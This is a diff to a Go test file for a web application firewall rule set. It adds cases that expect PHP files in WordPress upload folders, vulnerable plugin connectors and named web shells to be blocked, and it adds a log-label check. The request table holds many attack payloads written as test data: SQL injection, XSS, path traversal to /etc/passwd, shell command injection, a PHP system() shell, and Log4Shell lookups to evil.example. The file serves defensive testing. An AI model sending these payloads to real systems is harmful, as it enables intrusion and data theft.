@@ -11,6 +11,8 @@ import (
 	"net/http/httptest"
 	"net/url"
 	"os"
+	"regexp"
+	"strconv"
 	"strings"
 	"sync"
 	"testing"
@@ -236,59 +238,106 @@ func TestTheRuleSetBlocksCommonAttacksAndPassesOrdinaryTraffic(t *testing.T) {
 		headers                  map[string]string
 		want                     int
 	}{
-		"sql injection in the query":         {"GET", q("1' OR '1'='1' --"), "", "", nil, 403},
-		"union select":                       {"GET", q("1 UNION SELECT username,password FROM users"), "", "", nil, 403},
-		"sql injection in a form":            {"POST", "/login", form, "user=admin'--&pass=x", nil, 403},
-		"script tag in the query":            {"GET", q("<script>alert(document.cookie)</script>"), "", "", nil, 403},
-		"event handler":                      {"GET", q(`"><img src=x onerror=alert(1)>`), "", "", nil, 403},
-		"path traversal":                     {"GET", q("../../../../etc/passwd"), "", "", nil, 403},
-		"encoded traversal":                  {"GET", "/download?f=..%2f..%2f..%2fetc%2fpasswd", "", "", nil, 403},
-		"command injection":                  {"GET", q("; cat /etc/passwd"), "", "", nil, 403},
-		"log4shell in a header":              {"GET", "/", "", "", map[string]string{"X-Api-Version": "${jndi:ldap://evil.example/a}"}, 403},
-		"log4shell in the user agent":        {"GET", "/", "", "", map[string]string{"User-Agent": "${jndi:ldap://evil.example/a}"}, 403},
-		"scanner user agent":                 {"GET", "/", "", "", map[string]string{"User-Agent": "sqlmap/1.7"}, 403},
-		"php code":                           {"POST", "/x", form, "c=" + url.QueryEscape(`<?php system($_GET['c']); ?>`), nil, 403},
-		"XPath boolean predicate":            {"GET", q("' or true() or 'a'='b"), "", "", nil, 403},
-		"XPath arbitrary nested parentheses": {"GET", q("' or (((true()))) or 'a'='b"), "", "", nil, 403},
-		"XPath nested comments":              {"GET", q("' or (:(:nested:)comment:) true() or 'a'='b"), "", "", nil, 403},
-		"XPath non-enumerated function":      {"GET", q("' or upper-case(name())='ADMIN' or 'a'='b"), "", "", nil, 403},
-		"XPath comment before operator":      {"GET", q("'(:comment:)or true() or 'a'='b"), "", "", nil, 403},
-		"parenthesized template arithmetic":  {"GET", q("*{(8 + 8)}"), "", "", nil, 403},
-		"deeply encoded traversal":           {"GET", q("%25252525252e%25252525252e%25252525252fetc%25252525252fpasswd"), "", "", nil, 403},
-		"XPath nested function":              {"POST", "/api", "application/json", `{"input":"' or (not(false())) or 'a'='b"}`, nil, 403},
-		"XPath union":                        {"GET", q("'] | //user | //*['a'='a"), "", "", nil, 403},
-		"shell backtick":                     {"GET", q("`id`"), "", "", nil, 403},
-		"shell substitution":                 {"POST", "/api", "application/json", `{"input":"$(whoami)"}`, nil, 403},
-		"quoted command spelling":            {"GET", q(";i''d"), "", "", nil, 403},
-		"Windows command interpreter":        {"GET", q("cmd.exe /c dir"), "", "", nil, 403},
-		"nested encoded traversal":           {"GET", q("%252e%252e%252fetc%252fpasswd"), "", "", nil, 403},
-		"template arithmetic":                {"GET", q("*{7*7}"), "", "", nil, 403},
-		"template config object":             {"GET", q("{{config}}"), "", "", nil, 403},
-		"Java stream marker":                 {"GET", q("rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH"), "", "", nil, 403},
-		"hexadecimal URL host":               {"GET", q("http://0x7f000001/"), "", "", nil, 403},
-		"URL userinfo confusion":             {"GET", q("http://example.com@127.0.0.1/"), "", "", nil, 403},
-		"dict fetch protocol":                {"GET", q("dict://127.0.0.1:11211/stats"), "", "", nil, 403},
-		"json body injection":                {"POST", "/api", "application/json", `{"q":"1' OR '1'='1' --"}`, nil, 403},
+		"sql injection in the query":           {"GET", q("1' OR '1'='1' --"), "", "", nil, 403},
+		"union select":                         {"GET", q("1 UNION SELECT username,password FROM users"), "", "", nil, 403},
+		"sql injection in a form":              {"POST", "/login", form, "user=admin'--&pass=x", nil, 403},
+		"script tag in the query":              {"GET", q("<script>alert(document.cookie)</script>"), "", "", nil, 403},
+		"event handler":                        {"GET", q(`"><img src=x onerror=alert(1)>`), "", "", nil, 403},
+		"path traversal":                       {"GET", q("../../../../etc/passwd"), "", "", nil, 403},
+		"encoded traversal":                    {"GET", "/download?f=..%2f..%2f..%2fetc%2fpasswd", "", "", nil, 403},
+		"command injection":                    {"GET", q("; cat /etc/passwd"), "", "", nil, 403},
+		"log4shell in a header":                {"GET", "/", "", "", map[string]string{"X-Api-Version": "${jndi:ldap://evil.example/a}"}, 403},
+		"log4shell in the user agent":          {"GET", "/", "", "", map[string]string{"User-Agent": "${jndi:ldap://evil.example/a}"}, 403},
+		"scanner user agent":                   {"GET", "/", "", "", map[string]string{"User-Agent": "sqlmap/1.7"}, 403},
+		"php code":                             {"POST", "/x", form, "c=" + url.QueryEscape(`<?php system($_GET['c']); ?>`), nil, 403},
+		"XPath boolean predicate":              {"GET", q("' or true() or 'a'='b"), "", "", nil, 403},
+		"XPath arbitrary nested parentheses":   {"GET", q("' or (((true()))) or 'a'='b"), "", "", nil, 403},
+		"XPath nested comments":                {"GET", q("' or (:(:nested:)comment:) true() or 'a'='b"), "", "", nil, 403},
+		"XPath non-enumerated function":        {"GET", q("' or upper-case(name())='ADMIN' or 'a'='b"), "", "", nil, 403},
+		"XPath comment before operator":        {"GET", q("'(:comment:)or true() or 'a'='b"), "", "", nil, 403},
+		"parenthesized template arithmetic":    {"GET", q("*{(8 + 8)}"), "", "", nil, 403},
+		"deeply encoded traversal":             {"GET", q("%25252525252e%25252525252e%25252525252fetc%25252525252fpasswd"), "", "", nil, 403},
+		"XPath nested function":                {"POST", "/api", "application/json", `{"input":"' or (not(false())) or 'a'='b"}`, nil, 403},
+		"XPath union":                          {"GET", q("'] | //user | //*['a'='a"), "", "", nil, 403},
+		"shell backtick":                       {"GET", q("`id`"), "", "", nil, 403},
+		"shell substitution":                   {"POST", "/api", "application/json", `{"input":"$(whoami)"}`, nil, 403},
+		"quoted command spelling":              {"GET", q(";i''d"), "", "", nil, 403},
+		"Windows command interpreter":          {"GET", q("cmd.exe /c dir"), "", "", nil, 403},
+		"nested encoded traversal":             {"GET", q("%252e%252e%252fetc%252fpasswd"), "", "", nil, 403},
+		"template arithmetic":                  {"GET", q("*{7*7}"), "", "", nil, 403},
+		"template config object":               {"GET", q("{{config}}"), "", "", nil, 403},
+		"Java stream marker":                   {"GET", q("rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH"), "", "", nil, 403},
+		"hexadecimal URL host":                 {"GET", q("http://0x7f000001/"), "", "", nil, 403},
+		"URL userinfo confusion":               {"GET", q("http://example.com@127.0.0.1/"), "", "", nil, 403},
+		"dict fetch protocol":                  {"GET", q("dict://127.0.0.1:11211/stats"), "", "", nil, 403},
+		"json body injection":                  {"POST", "/api", "application/json", `{"q":"1' OR '1'='1' --"}`, nil, 403},
+		"PHPUnit eval-stdin":                   {"GET", "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "", "", nil, 403},
+		"PHP in WordPress uploads":             {"GET", "/wp-content/uploads/2024/05/x.php", "", "", nil, 403},
+		"PHP with a second extension":          {"GET", "/wp-content/uploads/x.php.jpg", "", "", nil, 403},
+		"PHP path info in the cache folder":    {"GET", "/wp-content/cache/x.phtml/y", "", "", nil, 403},
+		"PHP in the upgrade folder":            {"GET", "/wp-content/upgrade/x.php5", "", "", nil, 403},
+		"encoded PHP extension":                {"GET", "/wp-content/uploads/x.%70hp", "", "", nil, 403},
+		"double-encoded PHP extension":         {"GET", "/wp-content/uploads/x.%2570hp", "", "", nil, 403},
+		"PHP in uploads in capitals":           {"GET", "/WP-CONTENT/Uploads/X.PHP", "", "", nil, 403},
+		"PHP in uploads with backslashes":      {"GET", "/wp-content%5cuploads%5cx.php", "", "", nil, 403},
+		"PHP in uploads through a dot segment": {"GET", "/wp-content/plugins/../uploads/x.php", "", "", nil, 403},
+		"File Manager connector":               {"POST", "/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php", form, "cmd=upload", nil, 403},
+		"File Manager standalone connector":    {"POST", "/wp-content/plugins/wp-file-manager/lib/php/connector.standalone.php", form, "cmd=upload", nil, 403},
+		"PHP in File Manager's files folder":   {"GET", "/wp-content/plugins/wp-file-manager/lib/files/x.php", "", "", nil, 403},
+		"Slider Revolution update folder":      {"GET", "/wp-content/plugins/revslider/temp/update_extract/revslider/x.php", "", "", nil, 403},
+		"web shell by name":                    {"GET", "/images/c99.php", "", "", nil, 403},
+		"web shell with a query":               {"GET", "/wso.php?cmd=x", "", "", nil, 403},
 		// No XXE case: the CRS has no rule for external entities. Block them in the XML parser or with a rule of our own.
-		"XPath in an XML attribute": {"POST", "/api", "application/xml", `<input value="' or true() or 'a'='b"/>`, nil, 403},
-		"benign XML attribute":      {"POST", "/api", "application/xml", `<input value="O'Brien"/>`, nil, 200},
-		"home page":                 {"GET", "/", "", "", nil, 200},
-		"static asset":              {"GET", "/assets/app.css?v=3", "", "", nil, 200},
-		"search for ordinary words": {"GET", q("blue widgets for sale"), "", "", nil, 200},
-		"a name with an apostrophe": {"GET", q("O'Brien"), "", "", nil, 200},
-		"plain function discussion": {"GET", q("XPath count() and true() functions"), "", "", nil, 200},
-		"plain arithmetic":          {"GET", q("7*7=49"), "", "", nil, 200},
-		"template variable":         {"GET", q("{{customer_name}}"), "", "", nil, 200},
-		"semicolon prose":           {"GET", q("hello; welcome home"), "", "", nil, 200},
-		"ordinary login form":       {"POST", "/login", form, "user=alice&pass=correct+horse+battery", nil, 200},
-		"ordinary json":             {"POST", "/api", "application/json", `{"name":"Alice","items":[1,2,3],"note":"hello world"}`, nil, 200},
-		"a url in a field":          {"POST", "/profile", form, "website=" + url.QueryEscape("https://example.com/about?x=1"), nil, 200},
+		"XPath in an XML attribute":    {"POST", "/api", "application/xml", `<input value="' or true() or 'a'='b"/>`, nil, 403},
+		"benign XML attribute":         {"POST", "/api", "application/xml", `<input value="O'Brien"/>`, nil, 200},
+		"home page":                    {"GET", "/", "", "", nil, 200},
+		"static asset":                 {"GET", "/assets/app.css?v=3", "", "", nil, 200},
+		"search for ordinary words":    {"GET", q("blue widgets for sale"), "", "", nil, 200},
+		"a name with an apostrophe":    {"GET", q("O'Brien"), "", "", nil, 200},
+		"plain function discussion":    {"GET", q("XPath count() and true() functions"), "", "", nil, 200},
+		"plain arithmetic":             {"GET", q("7*7=49"), "", "", nil, 200},
+		"template variable":            {"GET", q("{{customer_name}}"), "", "", nil, 200},
+		"semicolon prose":              {"GET", q("hello; welcome home"), "", "", nil, 200},
+		"ordinary login form":          {"POST", "/login", form, "user=alice&pass=correct+horse+battery", nil, 200},
+		"ordinary json":                {"POST", "/api", "application/json", `{"name":"Alice","items":[1,2,3],"note":"hello world"}`, nil, 200},
+		"a url in a field":             {"POST", "/profile", form, "website=" + url.QueryEscape("https://example.com/about?x=1"), nil, 200},
+		"an image in uploads":          {"GET", "/wp-content/uploads/2024/05/photo.jpg", "", "", nil, 200},
+		"a photo named .photo":         {"GET", "/wp-content/uploads/2024/05/x.photo.png", "", "", nil, 200},
+		"a PDF about PHP":              {"GET", "/wp-content/uploads/php-guide.pdf", "", "", nil, 200},
+		"a plugin's own PHP":           {"GET", "/wp-content/plugins/akismet/akismet.php", "", "", nil, 200},
+		"File Manager's own script":    {"GET", "/wp-content/plugins/wp-file-manager/js/file_manager.js", "", "", nil, 200},
+		"an image File Manager kept":   {"GET", "/wp-content/plugins/wp-file-manager/lib/files/logo.png", "", "", nil, 200},
+		"a WordPress admin page":       {"GET", "/wp-admin/admin-ajax.php?action=heartbeat", "", "", nil, 200},
+		"a page named like a shell":    {"GET", "/reviews/c99-phone", "", "", nil, 200},
+		"a PHPUnit documentation page": {"GET", "/docs/phpunit/eval-stdin", "", "", nil, 200},
 	} {
 		t.Run(name, func(t *testing.T) {
 			if got := do(t, srv, tc.method, tc.target, tc.ct, tc.body, tc.headers); got != tc.want {
 				t.Errorf("status %d, want %d", got, tc.want)
 			}
 		})
+	}
+}
+
+// TestEveryLocalRuleHasItsLogLabel ties the fixed labels the default log uses to the rules' own messages, so a new local
+// rule is not logged without its family.
+func TestEveryLocalRuleHasItsLogLabel(t *testing.T) {
+	data, err := fs.ReadFile(crs.FS(), "local/REQUEST-499-CARNICAL.conf")
+	if err != nil {
+		t.Fatal(err)
+	}
+	rules := regexp.MustCompile(`"id:(\d+),[^"]*msg:'([^']*)'`).FindAllStringSubmatch(string(data), -1)
+	if len(rules) < 11 || len(rules) != strings.Count(string(data), "\nSecRule ") {
+		t.Fatalf("read %d rules with an id and a message", len(rules))
+	}
+	for _, r := range rules {
+		id, _ := strconv.Atoi(r[1])
+		if got := crs.LocalRuleMessage(id); got != r[2] {
+			t.Errorf("rule %d: label %q, message %q", id, got, r[2])
+		}
+	}
+	if got := crs.LocalRuleMessage(942100); got != "" {
+		t.Errorf("a CRS rule has a local label: %q", got)
 	}
 }
 
